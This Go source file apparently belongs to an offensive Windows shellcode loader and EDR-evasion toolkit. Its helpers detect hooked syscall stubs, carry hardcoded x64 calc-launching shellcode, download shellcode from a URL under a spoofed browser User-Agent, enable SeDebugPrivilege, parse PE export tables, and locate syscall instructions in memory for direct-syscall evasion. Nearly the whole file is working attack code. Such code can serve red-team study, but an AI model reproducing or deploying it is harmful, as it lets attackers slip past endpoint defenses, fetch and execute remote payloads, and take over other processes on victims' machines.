package core

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	// Third-party packages
	"github.com/Binject/debug/pe"
)

var HookCheck = []byte{0x4c, 0x8b, 0xd1, 0xb8} // Define hooked bytes to look for

type MayBeHookedError struct { // Define custom error for hooked functions
	Foundbytes []byte
}

func (e MayBeHookedError) Error() string {
	return fmt.Sprintf("may be hooked: wanted %x got %x", HookCheck, e.Foundbytes)
}

func rvaToOffset(pefile *pe.File, rva uint32) uint32 {
	for _, hdr := range pefile.Sections {
		baseoffset := uint64(rva)
		if baseoffset > uint64(hdr.VirtualAddress) &&
			baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
			return rva - hdr.VirtualAddress + hdr.Offset
		}
	}
	return rva
}

func CheckBytes(b []byte) (uint16, error) {
	if !bytes.HasPrefix(b, HookCheck) { // Check syscall bytes
		return 0, MayBeHookedError{Foundbytes: b}
	}

	return binary.LittleEndian.Uint16(b[4:8]), nil
}

// Generate a random integer between range
func RandomInt(max int, min int) int { // Return a random number between max and min
	rand.Seed(time.Now().UnixNano())
	rand_int := rand.Intn(max-min+1) + min
	return rand_int
}

func RandomString(length int) string { // Return random string passing an integer (length)
	var seededRand *rand.Rand = rand.New(
		rand.NewSource(time.Now().UnixNano()))
	const charset = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}

	return string(b)
}

func CalcShellcode() []byte {
	return []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3}
}

// Shellcode helper functions

func GetShellcodeFromUrl(sc_url string) ([]byte, error) { // Make request to URL return shellcode
	req, err := http.NewRequest("GET", sc_url, nil)
	if err != nil {
		return []byte(""), err
	}

	req.Header.Set("Accept", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return []byte(""), err
	}
	defer resp.Body.Close()

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return []byte(""), err
	}
	return b, nil
}

func GetShellcodeFromFile(file string) ([]byte, error) { // Read given file and return content in bytes
	f, err := os.Open(file)
	if err != nil {
		return []byte(""), err
	}
	defer f.Close()

	shellcode_bytes, err := ioutil.ReadAll(f)
	if err != nil {
		return []byte(""), err
	}

	return shellcode_bytes, nil
}

// Convert string to Sha1 (used for hashing)
func StrToSha1(str string) string {
	h := sha1.New()
	h.Write([]byte(str))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func CheckHighPrivs() (bool, error) { // Function to check if current user has Administrator privileges
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false, err
	}

	token := windows.Token(0)
	member, err := token.IsMember(sid) // Check if is inside admin group
	if err != nil {
		return false, err
	}

	return member, nil // return true (means high privs) or false (means low privs)
}

// Enable SeDebugPrivilege
func ElevateProcessToken() error {

	type Luid struct {
		lowPart  uint32 // DWORD
		highPart int32  // long
	}

	type LuidAndAttributes struct {
		luid       Luid   // LUID
		attributes uint32 // DWORD
	}

	type TokenPrivileges struct {
		privilegeCount uint32 // DWORD
		privileges     [1]LuidAndAttributes
	}

	const SeDebugPrivilege = "SeDebugPrivilege"
	const tokenAdjustPrivileges = 0x0020
	const tokenQuery = 0x0008
	var hToken uintptr

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	advapi32 := syscall.NewLazyDLL("advapi32.dll")

	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	GetLastError := kernel32.NewProc("GetLastError")
	OpenProcessToken := advapi32.NewProc("OpenProcessToken")
	LookupPrivilegeValue := advapi32.NewProc("LookupPrivilegeValueW")
	AdjustTokenPrivileges := advapi32.NewProc("AdjustTokenPrivileges")

	currentProcess, _, _ := GetCurrentProcess.Call()

	result, _, err := OpenProcessToken.Call(
		currentProcess,
		tokenAdjustPrivileges|tokenQuery,
		uintptr(unsafe.Pointer(&hToken)),
	)

	if result != 1 {
		return err
	}

	var tkp TokenPrivileges

	result, _, err = LookupPrivilegeValue.Call(
		uintptr(0),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(SeDebugPrivilege))),
		uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))),
	)

	if result != 1 {
		return err
	}

	const SePrivilegeEnabled uint32 = 0x00000002

	tkp.privilegeCount = 1
	tkp.privileges[0].attributes = SePrivilegeEnabled

	result, _, err = AdjustTokenPrivileges.Call(
		hToken,
		0,
		uintptr(unsafe.Pointer(&tkp)),
		0,
		uintptr(0),
		0,
	)

	if result != 1 {
		return err
	}

	result, _, _ = GetLastError.Call()
	if result != 0 {
		return err
	}

	return nil
}

/*

This code has been taken and modified from Doge-Gabh project

*/

type Export struct {
	Name           string
	VirtualAddress uintptr
}

type sstring struct {
	Length    uint16
	MaxLength uint16
	PWstr     *uint16
}

func (s sstring) String() string {
	return windows.UTF16PtrToString(s.PWstr)
}

func inMemLoads(modulename string) (uintptr, uintptr) {
	s, si, p := gMLO(0)
	start := p
	i := 1

	if strings.Contains(strings.ToLower(p), strings.ToLower(modulename)) {
		return s, si
	}

	for {
		s, si, p = gMLO(i)

		if p != "" {
			if strings.Contains(strings.ToLower(p), strings.ToLower(modulename)) {
				return s, si
			}
		}

		if p == start {
			break
		}

		i++
	}

	return 0, 0
}

func getExport(pModuleBase uintptr) []Export {
	var exports []Export
	var pImageNtHeaders = (*IMAGE_NT_HEADER)(unsafe.Pointer(pModuleBase + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(pModuleBase)).E_lfanew))) // ntH(pModuleBase)
	//IMAGE_NT_SIGNATURE
	if pImageNtHeaders.Signature != 0x00004550 {
		return nil
	}
	var pImageExportDirectory *imageExportDir

	pImageExportDirectory = ((*imageExportDir)(unsafe.Pointer(uintptr(pModuleBase + uintptr(pImageNtHeaders.OptionalHeader.DataDirectory[0].VirtualAddress)))))

	pdwAddressOfFunctions := pModuleBase + uintptr(pImageExportDirectory.AddressOfFunctions)
	pdwAddressOfNames := pModuleBase + uintptr(pImageExportDirectory.AddressOfNames)

	pwAddressOfNameOrdinales := pModuleBase + uintptr(pImageExportDirectory.AddressOfNameOrdinals)

	for cx := uintptr(0); cx < uintptr((pImageExportDirectory).NumberOfNames); cx++ {
		var export Export
		pczFunctionName := pModuleBase + uintptr(*(*uint32)(unsafe.Pointer(pdwAddressOfNames + cx*4)))
		pFunctionAddress := pModuleBase + uintptr(*(*uint32)(unsafe.Pointer(pdwAddressOfFunctions + uintptr(*(*uint16)(unsafe.Pointer(pwAddressOfNameOrdinales + cx*2)))*4)))
		export.Name = windows.BytePtrToString((*byte)(unsafe.Pointer(pczFunctionName)))
		export.VirtualAddress = uintptr(pFunctionAddress)
		exports = append(exports, export)
	}

	return exports
}

func memcpy(dst, src, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*uint8)(unsafe.Pointer(dst + i)) = *(*uint8)(unsafe.Pointer(src + i))
	}
}

func findFirstSyscallOffset(pMem []byte, size int, moduleAddress uintptr) int {

	offset := 0
	pattern1 := []byte{0x0f, 0x05, 0xc3}
	pattern2 := []byte{0xcc, 0xcc, 0xcc}

	// find first occurrence of syscall+ret instructions
	for i := 0; i < size-3; i++ {
		instructions := []byte{pMem[i], pMem[i+1], pMem[i+2]}

		if (instructions[0] == pattern1[0]) && (instructions[1] == pattern1[1]) && (instructions[2] == pattern1[2]) {
			offset = i
			break
		}
	}

	// find the beginning of the syscall
	for i := 3; i < 50; i++ {
		instructions := []byte{pMem[offset-i], pMem[offset-i+1], pMem[offset-i+2]}
		if (instructions[0] == pattern2[0]) && (instructions[1] == pattern2[1]) && (instructions[2] == pattern2[2]) {
			offset = offset - i + 3
			break
		}
	}

	return offset
}

func findLastSyscallOffset(pMem []byte, size int, moduleAddress uintptr) int {

	offset := 0
	pattern := []byte{0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc}

	for i := size - 9; i > 0; i-- {
		instructions := []byte{pMem[i], pMem[i+1], pMem[i+2], pMem[i+3], pMem[i+4], pMem[i+5], pMem[i+6], pMem[i+7], pMem[i+8]}

		if (instructions[0] == pattern[0]) && (instructions[1] == pattern[1]) && (instructions[2] == pattern[2]) {
			offset = i + 6
			break
		}
	}

	return offset
}

func gMLO(i int) (start uintptr, size uintptr, modulepath string) {
	var badstring *sstring
	start, size, badstring = getMLO(i)
	modulepath = badstring.String()
	return
}

func getMLO(i int) (start uintptr, size uintptr, modulepath *sstring)

func uint16Down(b []byte, idx uint16) uint16 {
	_ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
	return uint16(b[0]) - idx | uint16(b[1])<<8
}

func uint16Up(b []byte, idx uint16) uint16 {
	_ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
	return uint16(b[0]) + idx | uint16(b[1])<<8
}

func contains(slice []string, item string) bool {
	set := make(map[string]struct{}, len(slice))
	for _, s := range slice {
		set[s] = struct{}{}
	}

	_, ok := set[item]
	return ok
}
